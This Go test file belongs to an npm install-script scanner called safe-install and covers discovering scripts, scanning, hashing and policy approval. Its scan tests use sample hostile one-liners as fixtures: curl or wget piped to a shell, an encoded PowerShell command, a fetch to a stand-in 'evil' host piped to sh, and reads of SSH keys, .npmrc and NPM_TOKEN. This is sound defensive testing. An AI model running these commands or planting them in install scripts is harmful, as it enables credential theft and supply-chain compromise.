package scripts

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"github.com/crossben/safe-install/internal/analyze"
	"github.com/crossben/safe-install/internal/lockfile"
	"github.com/crossben/safe-install/internal/policy"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func pkgJSON(name, version, scripts string) string {
	s := `{"name":"` + name + `","version":"` + version + `"`
	if scripts != "" {
		s += `,"scripts":` + scripts
	}
	return s + "}"
}

func graphOf(ids ...string) *lockfile.Graph {
	g := &lockfile.Graph{Packages: map[string]*lockfile.Package{}}
	for _, id := range ids {
		i := 0
		for j := 1; j < len(id); j++ {
			if id[j] == '@' {
				i = j
			}
		}
		g.Packages[id] = &lockfile.Package{ID: id, Name: id[:i], Version: id[i+1:]}
	}
	return g
}

func TestDiscover(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")
	// npm-style hoisted + nested, scoped, a gyp package, a package without scripts.
	writeFile(t, filepath.Join(nm, "esbuild", "package.json"), pkgJSON("esbuild", "0.25.10", `{"postinstall":"node install.js","test":"x"}`))
	writeFile(t, filepath.Join(nm, "debug", "package.json"), pkgJSON("debug", "2.6.9", ""))
	writeFile(t, filepath.Join(nm, "debug", "node_modules", "ms", "package.json"), pkgJSON("ms", "2.0.0", `{"preinstall":"echo nested"}`))
	writeFile(t, filepath.Join(nm, "@scope", "native", "package.json"), pkgJSON("@scope/native", "1.0.0", ""))
	writeFile(t, filepath.Join(nm, "@scope", "native", "binding.gyp"), "{}")
	// pnpm-style store.
	writeFile(t, filepath.Join(nm, ".pnpm", "sharp@0.34.0", "node_modules", "sharp", "package.json"), pkgJSON("sharp", "0.34.0", `{"install":"node install/check"}`))

	g := graphOf("esbuild@0.25.10", "debug@2.6.9", "ms@2.0.0", "@scope/native@1.0.0", "sharp@0.34.0", "absent@1.0.0")
	cands, missing := Discover(dir, g)

	got := map[string]*Candidate{}
	for _, c := range cands {
		got[c.Package.ID] = c
	}
	if len(got) != 4 {
		t.Fatalf("candidates = %v", keys(got))
	}
	if c := got["esbuild@0.25.10"]; c == nil || !slices.Equal(c.Stages(), []string{"postinstall"}) || c.Dir != filepath.Join(nm, "esbuild") {
		t.Errorf("esbuild: %+v", c)
	}
	if c := got["ms@2.0.0"]; c == nil || c.Scripts["preinstall"] != "echo nested" {
		t.Errorf("nested ms: %+v", c)
	}
	if c := got["@scope/native@1.0.0"]; c == nil || c.Scripts["install"] != "node-gyp rebuild" || !c.Implicit {
		t.Errorf("gyp: %+v", c)
	}
	if c := got["sharp@0.34.0"]; c == nil || c.Scripts["install"] != "node install/check" {
		t.Errorf("pnpm sharp: %+v", c)
	}
	if !slices.Equal(missing, []string{"absent@1.0.0"}) {
		t.Errorf("missing = %v", missing)
	}
}

func keys(m map[string]*Candidate) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

func TestScan(t *testing.T) {
	tests := []struct {
		name   string
		script string
		file   string // contents of install.js, run by the script
		rule   string
		sev    analyze.Severity
	}{
		{"plain", "node install.js", "console.log('hi')", "SI-SCR-001", analyze.Medium},
		{"curl pipe sh", "curl -fsSL https://x.sh | sh", "", "SI-SCR-002", analyze.Block},
		{"wget pipe bash", "wget -qO- http://x | bash", "", "SI-SCR-002", analyze.Block},
		{"powershell encoded", "powershell -enc SQBFAFgA", "", "SI-SCR-002", analyze.Block},
		{"iwr iex", "iwr https://x/p.ps1 | iex", "", "SI-SCR-002", analyze.Block},
		{"download exec in file", "node install.js", "require('child_process').execSync('curl https://evil | sh')", "SI-SCR-002", analyze.Block},
		{"eval in file", "node install.js", "eval(Buffer.from(x, 'base64').toString())", "SI-SCR-003", analyze.High},
		{"new Function", "node install.js", "new Function(code)()", "SI-SCR-003", analyze.High},
		{"long blob", "node install.js", "const p = '" + longBlob() + "'", "SI-SCR-003", analyze.High},
		{"ssh keys", "node install.js", "fs.readFileSync(os.homedir() + '/.ssh/id_rsa')", "SI-SCR-004", analyze.High},
		{"npmrc", "cat ~/.npmrc", "", "SI-SCR-004", analyze.High},
		{"token env", "node install.js", "send(process.env.NPM_TOKEN)", "SI-SCR-004", analyze.High},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			if tt.file != "" {
				writeFile(t, filepath.Join(dir, "install.js"), tt.file)
			}
			c := &Candidate{Dir: dir, Scripts: map[string]string{"postinstall": tt.script}}
			fs := Scan(c)
			found := false
			for _, f := range fs {
				if f.Rule == tt.rule && f.Severity == tt.sev {
					found = true
				}
			}
			if !found {
				t.Fatalf("want %s/%s, got %+v", tt.rule, tt.sev, fs)
			}
		})
	}
}

func TestHavingScriptsCountsOnce(t *testing.T) {
	c := &Candidate{Dir: t.TempDir(), Scripts: map[string]string{"preinstall": "node a.js", "install": "node b.js", "postinstall": "node c.js"}}
	if _, level := analyze.Score(Scan(c)); level != analyze.LevelMedium {
		t.Fatalf("level = %s, want medium for three benign stages", level)
	}
}

func TestScanStaysInsidePackage(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "secret.js"), "eval(x)")
	pkg := filepath.Join(root, "pkg")
	if err := os.MkdirAll(pkg, 0o750); err != nil {
		t.Fatal(err)
	}
	c := &Candidate{Dir: pkg, Scripts: map[string]string{"install": "node ../secret.js"}}
	for _, f := range Scan(c) {
		if f.Rule == "SI-SCR-003" {
			t.Fatal("scanned a file outside the package directory")
		}
	}
}

func TestOrderDependenciesFirst(t *testing.T) {
	g := graphOf("app-native@1.0.0", "lib-native@1.0.0", "leaf@1.0.0")
	g.Packages["app-native@1.0.0"].Dependencies = []string{"lib-native@1.0.0"}
	g.Packages["lib-native@1.0.0"].Dependencies = []string{"leaf@1.0.0"}
	cands := []*Candidate{{Package: g.Packages["app-native@1.0.0"]}, {Package: g.Packages["leaf@1.0.0"]}, {Package: g.Packages["lib-native@1.0.0"]}}
	var got []string
	for _, c := range Order(cands, g) {
		got = append(got, c.Package.ID)
	}
	if want := []string{"leaf@1.0.0", "lib-native@1.0.0", "app-native@1.0.0"}; !slices.Equal(got, want) {
		t.Fatalf("order = %v, want %v", got, want)
	}
}

func longBlob() string {
	b := make([]byte, 400)
	for i := range b {
		b[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i*7%64]
	}
	return string(b)
}

func TestHash(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "install.js"), "console.log(1)")
	c := &Candidate{Dir: dir, Scripts: map[string]string{"preinstall": "echo a", "postinstall": "node install.js"}}
	h := c.Hash()
	if h == "" || h[:7] != "sha256-" {
		t.Fatalf("hash = %q", h)
	}
	for i := 0; i < 20; i++ { // map iteration order must not matter
		if c.Hash() != h {
			t.Fatal("hash is not stable")
		}
	}
	writeFile(t, filepath.Join(dir, "install.js"), "console.log(2)")
	if c.Hash() == h {
		t.Fatal("hash ignores the file the script runs")
	}
	c2 := &Candidate{Dir: dir, Scripts: map[string]string{"preinstall": "echo b", "postinstall": "node install.js"}}
	if c2.Hash() == c.Hash() {
		t.Fatal("hash ignores the command")
	}
}

func TestApprovalState(t *testing.T) {
	now := time.Date(2026, 10, 6, 12, 0, 0, 0, time.UTC)
	c := &Candidate{Package: &lockfile.Package{ID: "a@2.0.0", Name: "a", Version: "2.0.0"}, Dir: t.TempDir(), Scripts: map[string]string{"install": "echo hi"}}
	pol := func(m map[string]policy.Approval) *policy.Policy {
		return &policy.Policy{File: policy.File{AllowScripts: m}}
	}
	provenance := func(repo string) Provenance {
		return func(_, _ string) string { return repo }
	}
	const repo = "https://github.com/a/a"

	tests := []struct {
		name  string
		pol   *policy.Policy
		prov  Provenance
		state State
		rule  string
	}{
		{"none", pol(nil), nil, Unapproved, ""},
		{"hash match", pol(map[string]policy.Approval{"a": {Hash: c.Hash()}}), nil, Approved, ""},
		{"hash changed", pol(map[string]policy.Approval{"a": {Version: "1.0.0", Hash: "sha256-old"}}), nil, Changed, "SI-SCR-005"},
		{"expired", pol(map[string]policy.Approval{"a": {Hash: c.Hash(), Expires: "2026-10-01"}}), nil, Expired, ""},
		{"provenance same repo", pol(map[string]policy.Approval{"a": {Hash: "sha256-old", Trust: policy.TrustProvenance, Repository: repo}}), provenance(repo), ApprovedByProvenance, ""},
		{"provenance other repo", pol(map[string]policy.Approval{"a": {Hash: "sha256-old", Trust: policy.TrustProvenance, Repository: repo}}), provenance("https://github.com/fork/a"), Changed, "SI-SCR-005"},
		{"provenance missing", pol(map[string]policy.Approval{"a": {Trust: policy.TrustProvenance, Repository: repo}}), provenance(""), Changed, "SI-SCR-005"},
		{"glob scope", pol(map[string]policy.Approval{"*": {Trust: policy.TrustProvenance, Repository: repo}}), provenance(repo), ApprovedByProvenance, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			st, f := ApprovalState(c, tt.pol, now, tt.prov)
			if st != tt.state || (tt.rule == "") != (f == nil) || (f != nil && f.Rule != tt.rule) {
				t.Fatalf("state %v finding %+v; want %v %q", st, f, tt.state, tt.rule)
			}
		})
	}
}
